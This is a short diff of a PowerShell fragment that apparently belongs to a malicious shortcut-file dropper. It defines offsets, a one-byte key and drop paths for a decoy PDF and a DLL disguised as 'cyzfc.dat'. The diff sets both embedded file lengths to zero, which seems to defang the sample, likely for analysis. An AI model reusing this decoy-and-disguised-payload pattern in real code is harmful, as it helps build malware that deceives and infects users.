@@ -2,9 +2,9 @@ $filename = "ds7002.lnk";
 $key = [System.Text.Encoding]::UTF8.GetBytes('a')[0];
 
 $pdf_start_byte = 0x00003000;
-$pdf_filelength = 106856;
+$pdf_filelength = 0000;
 $dll_start_byte = 0x00030000;
-$dll_filelength = 5120;
+$dll_filelength = 0000;
 
 $pdf_file = "$env:temp\ds7002.PDF";
 $dll_file = "$env:localappdata\cyzfc.dat";
